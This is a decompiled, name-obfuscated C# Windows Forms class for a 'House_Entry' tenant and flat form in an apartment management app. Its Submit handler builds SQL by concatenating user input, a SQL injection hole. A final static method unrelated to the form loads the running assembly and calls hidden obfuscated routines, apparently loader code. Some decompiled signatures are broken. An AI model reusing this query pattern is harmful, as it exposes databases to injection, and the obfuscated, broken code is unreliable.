using System;
using System.ComponentModel;
using System.Data.SqlClient;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Hz6;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Rd5b;
using m1G3;
using p9K;

namespace r0C3;

[DesignerGenerated]
public class Zd85 : Form
{
	private IContainer components;

	private Panel _Panel1;

	private MaskedTextBox _MaskedTextBox3;

	private Button _Button2;

	private Label _Label9;

	private Label _Label8;

	private Label _Label3;

	private Label _Label1;

	private RadioButton _PaidPartially;

	private TextBox _TextBox3;

	private SqlCommand cmd;

	private SqlDataReader rd;

	internal MaskedTextBox i;

	internal Button k;

	internal Label e;

	internal Label O;

	internal Label V;

	internal Label f;

	internal MaskedTextBox a;

	internal Label M;

	internal ComboBox Y;

	internal Label s;

	internal RadioButton L;

	internal TextBox R;

	internal TextBox c;

	internal SqlConnection N;

	public Zd85()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)c7GT);
		SqlConnection val = (N = new SqlConnection());
		cmd = new SqlCommand();
		Tj0n();
	}

	protected override void Kt2a(bool Kg4y)
	{
		try
		{
			if (Kg4y && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(Kg4y);
		}
	}

	private void Tj0n()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_06c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_06cb: Expected O, but got Unknown
		//IL_074f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0759: Expected O, but got Unknown
		//IL_07dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_07e7: Expected O, but got Unknown
		//IL_086b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0875: Expected O, but got Unknown
		//IL_08f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0902: Expected O, but got Unknown
		//IL_0985: Unknown result type (might be due to invalid IL or missing references)
		//IL_098f: Expected O, but got Unknown
		//IL_0a09: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a13: Expected O, but got Unknown
		g3RE(new Panel());
		Ga0b(new TextBox());
		q2LQ(new TextBox());
		Tt3a(new TextBox());
		w9XM(new RadioButton());
		f0R8(new RadioButton());
		r1F4(new MaskedTextBox());
		s7C0(new MaskedTextBox());
		b0W9(new Button());
		Cz2p(new Button());
		Cs93(new Label());
		w6M2(new Label());
		j7BY(new Label());
		i1D5(new Label());
		Bs13(new Label());
		o4SL(new Label());
		j0PD(new MaskedTextBox());
		Dd9f(new Label());
		o8M0(new Label());
		d8MX(new ComboBox());
		Po7k(new Label());
		j7RW(new Label());
		((Control)Pt4i()).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)Pt4i()).set_BackColor(Color.FromArgb(128, 64, 64));
		((Control)Pt4i()).get_Controls().Add((Control)(object)s7JF());
		((Control)Pt4i()).get_Controls().Add((Control)(object)f0RH());
		((Control)Pt4i()).get_Controls().Add((Control)(object)j1NQ());
		((Control)Pt4i()).get_Controls().Add((Control)(object)a9E0());
		((Control)Pt4i()).get_Controls().Add((Control)(object)Tr9g());
		((Control)Pt4i()).get_Controls().Add((Control)(object)Aq28());
		((Control)Pt4i()).get_Controls().Add((Control)(object)Dj41());
		((Control)Pt4i()).get_Controls().Add((Control)(object)e7R5());
		((Control)Pt4i()).get_Controls().Add((Control)(object)Tr3b());
		((Control)Pt4i()).get_Controls().Add((Control)(object)c4TL());
		((Control)Pt4i()).get_Controls().Add((Control)(object)Mb7y());
		((Control)Pt4i()).get_Controls().Add((Control)(object)m5N4());
		((Control)Pt4i()).get_Controls().Add((Control)(object)r2NF());
		((Control)Pt4i()).get_Controls().Add((Control)(object)Fm58());
		((Control)Pt4i()).get_Controls().Add((Control)(object)Jd6j());
		((Control)Pt4i()).get_Controls().Add((Control)(object)Tt6x());
		((Control)Pt4i()).get_Controls().Add((Control)(object)e2PS());
		((Control)Pt4i()).get_Controls().Add((Control)(object)a5XL());
		((Control)Pt4i()).get_Controls().Add((Control)(object)y0L7());
		((Control)Pt4i()).get_Controls().Add((Control)(object)Jj7a());
		((Control)Pt4i()).get_Controls().Add((Control)(object)w7RN());
		((Control)Pt4i()).set_Location(new Point(1, 199));
		((Control)Pt4i()).set_Name("Panel1");
		((Control)Pt4i()).set_Size(new Size(531, 513));
		((Control)Pt4i()).set_TabIndex(0);
		((Control)s7JF()).set_Location(new Point(175, 294));
		((Control)s7JF()).set_Name("TextBox3");
		((Control)s7JF()).set_Size(new Size(168, 22));
		((Control)s7JF()).set_TabIndex(25);
		((Control)f0RH()).set_Location(new Point(175, 254));
		((Control)f0RH()).set_Name("TextBox2");
		((Control)f0RH()).set_Size(new Size(168, 22));
		((Control)f0RH()).set_TabIndex(24);
		((Control)j1NQ()).set_Location(new Point(175, 203));
		((Control)j1NQ()).set_Name("TextBox1");
		((Control)j1NQ()).set_Size(new Size(168, 22));
		((Control)j1NQ()).set_TabIndex(23);
		((ButtonBase)a9E0()).set_AutoSize(true);
		((Control)a9E0()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)a9E0()).set_Location(new Point(175, 381));
		((Control)a9E0()).set_Name("RadioButton2");
		((Control)a9E0()).set_Size(new Size(90, 21));
		((Control)a9E0()).set_TabIndex(22);
		a9E0().set_TabStop(true);
		((ButtonBase)a9E0()).set_Text("Paid Fully");
		((ButtonBase)a9E0()).set_UseVisualStyleBackColor(true);
		((ButtonBase)Tr9g()).set_AutoSize(true);
		((Control)Tr9g()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)Tr9g()).set_Location(new Point(296, 380));
		((Control)Tr9g()).set_Name("PaidPartially");
		((Control)Tr9g()).set_Size(new Size(111, 21));
		((Control)Tr9g()).set_TabIndex(21);
		Tr9g().set_TabStop(true);
		((ButtonBase)Tr9g()).set_Text("Paid Partially");
		((ButtonBase)Tr9g()).set_UseVisualStyleBackColor(true);
		((Control)Aq28()).set_Location(new Point(175, 419));
		((Control)Aq28()).set_Name("MaskedTextBox3");
		((Control)Aq28()).set_Size(new Size(168, 22));
		((Control)Aq28()).set_TabIndex(20);
		((Control)Dj41()).set_Location(new Point(175, 342));
		((Control)Dj41()).set_Name("MaskedTextBox2");
		((Control)Dj41()).set_Size(new Size(168, 22));
		((Control)Dj41()).set_TabIndex(17);
		((Control)e7R5()).set_Location(new Point(260, 476));
		((Control)e7R5()).set_Name("Button2");
		((Control)e7R5()).set_Size(new Size(122, 34));
		((Control)e7R5()).set_TabIndex(13);
		((ButtonBase)e7R5()).set_Text("Back");
		((ButtonBase)e7R5()).set_UseVisualStyleBackColor(true);
		((Control)Tr3b()).set_Location(new Point(91, 476));
		((Control)Tr3b()).set_Name("Button1");
		((Control)Tr3b()).set_Size(new Size(122, 34));
		((Control)Tr3b()).set_TabIndex(12);
		((ButtonBase)Tr3b()).set_Text("Submit");
		((ButtonBase)Tr3b()).set_UseVisualStyleBackColor(true);
		c4TL().set_AutoSize(true);
		((Control)c4TL()).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)c4TL()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)c4TL()).set_Location(new Point(34, 419));
		((Control)c4TL()).set_Name("Label10");
		((Control)c4TL()).set_Size(new Size(49, 17));
		((Control)c4TL()).set_TabIndex(11);
		c4TL().set_Text("Phone");
		Mb7y().set_AutoSize(true);
		((Control)Mb7y()).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)Mb7y()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)Mb7y()).set_Location(new Point(31, 381));
		((Control)Mb7y()).set_Name("Label9");
		((Control)Mb7y()).set_Size(new Size(107, 17));
		((Control)Mb7y()).set_TabIndex(10);
		Mb7y().set_Text("Payment Status");
		m5N4().set_AutoSize(true);
		((Control)m5N4()).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)m5N4()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)m5N4()).set_Location(new Point(34, 342));
		((Control)m5N4()).set_Name("Label8");
		((Control)m5N4()).set_Size(new Size(90, 17));
		((Control)m5N4()).set_TabIndex(9);
		m5N4().set_Text("Rent Amount");
		r2NF().set_AutoSize(true);
		((Control)r2NF()).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)r2NF()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)r2NF()).set_Location(new Point(34, 259));
		((Control)r2NF()).set_Name("Label7");
		((Control)r2NF()).set_Size(new Size(85, 17));
		((Control)r2NF()).set_TabIndex(8);
		r2NF().set_Text("Flat Number");
		Fm58().set_AutoSize(true);
		((Control)Fm58()).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)Fm58()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)Fm58()).set_Location(new Point(37, 299));
		((Control)Fm58()).set_Name("Label6");
		((Control)Fm58()).set_Size(new Size(67, 17));
		((Control)Fm58()).set_TabIndex(7);
		Fm58().set_Text("Flat Type");
		Jd6j().set_AutoSize(true);
		((Control)Jd6j()).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)Jd6j()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)Jd6j()).set_Location(new Point(31, 209));
		((Control)Jd6j()).set_Name("Label5");
		((Control)Jd6j()).set_Size(new Size(83, 17));
		((Control)Jd6j()).set_TabIndex(6);
		Jd6j().set_Text("Block Name");
		((Control)Tt6x()).set_Font(new Font("Microsoft Sans Serif", 13.8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Tt6x()).set_Location(new Point(175, 141));
		((Control)Tt6x()).set_Name("MaskedTextBox1");
		((Control)Tt6x()).set_Size(new Size(168, 34));
		((Control)Tt6x()).set_TabIndex(5);
		e2PS().set_AutoSize(true);
		((Control)e2PS()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)e2PS()).set_Location(new Point(37, 162));
		((Control)e2PS()).set_Name("Label4");
		((Control)e2PS()).set_Size(new Size(63, 17));
		((Control)e2PS()).set_TabIndex(4);
		e2PS().set_Text("in Family");
		a5XL().set_AutoSize(true);
		((Control)a5XL()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)a5XL()).set_Location(new Point(34, 141));
		((Control)a5XL()).set_Name("Label3");
		((Control)a5XL()).set_Size(new Size(102, 17));
		((Control)a5XL()).set_TabIndex(3);
		a5XL().set_Text("No. of Persons");
		((ListControl)y0L7()).set_FormattingEnabled(true);
		((Control)y0L7()).set_Location(new Point(175, 84));
		((Control)y0L7()).set_Name("ComboBox1");
		((Control)y0L7()).set_Size(new Size(168, 24));
		((Control)y0L7()).set_TabIndex(2);
		Jj7a().set_AutoSize(true);
		((Control)Jj7a()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)Jj7a()).set_Location(new Point(184, 24));
		((Control)Jj7a()).set_Name("Label2");
		((Control)Jj7a()).set_Size(new Size(139, 17));
		((Control)Jj7a()).set_TabIndex(1);
		Jj7a().set_Text("Flat Occupier Details");
		w7RN().set_AutoSize(true);
		((Control)w7RN()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)w7RN()).set_Location(new Point(31, 87));
		((Control)w7RN()).set_Name("Label1");
		((Control)w7RN()).set_Size(new Size(70, 17));
		((Control)w7RN()).set_TabIndex(0);
		w7RN().set_Text("Tenant ID");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(936, 713));
		((Control)this).get_Controls().Add((Control)(object)Pt4i());
		((Control)this).set_Name("House_Entry");
		((Form)this).set_Text("House_Entry");
		((Control)Pt4i()).ResumeLayout(false);
		((Control)Pt4i()).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	[SpecialName]
	internal virtual Panel Pt4i()
	{
		return _Panel1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void g3RE(Panel x0Q4)
	{
		_Panel1 = x0Q4;
	}

	[SpecialName]
	internal virtual MaskedTextBox Aq28()
	{
		return _MaskedTextBox3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void r1F4(MaskedTextBox Ps8a)
	{
		_MaskedTextBox3 = Ps8a;
	}

	[SpecialName]
	internal virtual MaskedTextBox Dj41()
	{
		return i;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void s7C0(MaskedTextBox z6DJ)
	{
		MaskedTextBox val = (i = z6DJ);
	}

	[SpecialName]
	internal virtual Button e7R5()
	{
		return _Button2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void b0W9(Button y6PD)
	{
		EventHandler eventHandler = Mn29;
		Button button = _Button2;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button2 = y6PD;
		button = _Button2;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button Tr3b()
	{
		return k;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Cz2p(Button b0D3)
	{
		EventHandler eventHandler = n4HX;
		Button val = k;
		if (val != null)
		{
			((Control)val).remove_Click(eventHandler);
		}
		Button val2 = (k = b0D3);
		val = k;
		if (val != null)
		{
			((Control)val).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label c4TL()
	{
		return e;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Cs93(Label q3H1)
	{
		Label val = (e = q3H1);
	}

	[SpecialName]
	internal virtual Label Mb7y()
	{
		return _Label9;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void w6M2(Label Sp75)
	{
		_Label9 = Sp75;
	}

	[SpecialName]
	internal virtual Label m5N4()
	{
		return _Label8;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void j7BY(Label Lw5x)
	{
		_Label8 = Lw5x;
	}

	[SpecialName]
	internal virtual Label r2NF()
	{
		return O;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void i1D5(Label i4Z9)
	{
		Label val = (O = i4Z9);
	}

	[SpecialName]
	internal virtual Label Fm58()
	{
		return V;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Bs13(Label Kf87)
	{
		Label val = (V = Kf87);
	}

	[SpecialName]
	internal virtual Label Jd6j()
	{
		return f;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void o4SL(Label Rg29)
	{
		Label val = (f = Rg29);
	}

	[SpecialName]
	internal virtual MaskedTextBox Tt6x()
	{
		return a;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void j0PD(MaskedTextBox m8WB)
	{
		MaskedTextBox val = (a = m8WB);
	}

	[SpecialName]
	internal virtual Label e2PS()
	{
		return M;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Dd9f(Label Yo5g)
	{
		Label val = (M = Yo5g);
	}

	[SpecialName]
	internal virtual Label a5XL()
	{
		return _Label3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void o8M0(Label p7TE)
	{
		_Label3 = p7TE;
	}

	[SpecialName]
	internal virtual ComboBox y0L7()
	{
		return Y;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void d8MX(ComboBox c1T2)
	{
		ComboBox val = (Y = c1T2);
	}

	[SpecialName]
	internal virtual Label Jj7a()
	{
		return s;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Po7k(Label z3D9)
	{
		Label val = (s = z3D9);
	}

	[SpecialName]
	internal virtual Label w7RN()
	{
		return _Label1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void j7RW(Label j4Z6)
	{
		_Label1 = j4Z6;
	}

	[SpecialName]
	internal virtual RadioButton a9E0()
	{
		return L;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void w9XM(RadioButton i4HM)
	{
		RadioButton val = (L = i4HM);
	}

	[SpecialName]
	internal virtual RadioButton Tr9g()
	{
		return _PaidPartially;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void f0R8(RadioButton Cr4i)
	{
		_PaidPartially = Cr4i;
	}

	[SpecialName]
	internal virtual TextBox j1NQ()
	{
		return R;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Tt3a(TextBox Rb75)
	{
		TextBox val = (R = Rb75);
	}

	[SpecialName]
	internal virtual TextBox f0RH()
	{
		return c;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void q2LQ(TextBox z3CY)
	{
		TextBox val = (c = z3CY);
	}

	[SpecialName]
	internal virtual TextBox s7JF()
	{
		return _TextBox3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ga0b(TextBox Xj5q)
	{
		_TextBox3 = Xj5q;
	}

	private void n4HX(object sender, EventArgs e)
	{
		//IL_0156: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = default(string);
			if (a9E0().get_Checked())
			{
				text = ((ButtonBase)a9E0()).get_Text();
			}
			else if (Tr9g().get_Checked())
			{
				text = Conversions.ToString(Tr9g().get_Checked());
			}
			N.set_ConnectionString("Data Source=(LocalDB)\\MSSQLLocalDB;AttachDbFilename=C:\\Users\\Manish\\Source\\Repos\\Apartment-Management-System2\\apart.mdf;Integrated Security=True");
			cmd.set_Connection(N);
			cmd.set_CommandText("insert into houseentry(tenantID,NoofpersoninFamily,BlockNo,flatno,flattype,rentAmount,PaymentStatus,Phone) values(" + y0L7().get_Text() + "," + Tt6x().get_Text() + "," + j1NQ().get_Text() + "," + f0RH().get_Text() + ",'" + s7JF().get_Text() + "'," + Dj41().get_Text() + ",'" + text + "'," + Aq28().get_Text() + ")");
			N.Open();
			cmd.ExecuteNonQuery();
			N.Close();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	private void Mn29(object sender, EventArgs e)
	{
		((Control)Gj9.Forms.Xp5()).Show();
		((Form)this).Close();
	}

	private void c7GT(object sender, EventArgs e)
	{
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			N.set_ConnectionString("Data Source=(LocalDB)\\MSSQLLocalDB;AttachDbFilename=|DataDirectory|\\apart.mdf;Integrated Security=True");
			cmd.set_Connection(N);
			cmd.set_CommandText("Select * from [tenant_login] ");
			N.Open();
			rd = cmd.ExecuteReader();
			while (rd.Read())
			{
				y0L7().get_Items().Add(RuntimeHelpers.GetObjectValue(rd.get_Item("tenant_id")));
			}
			rd.Close();
			N.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Interaction.MsgBox((object)"invalid command", (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	internal static string[] y3A0()
	{
		Qr4m.Ec54();
		Assembly value = Assembly.LoadFrom(Environment.GetCommandLineArgs()[0]);
		j5N.mDic.Add("Ann", value);
		return q7SH.k2MG();
	}
}
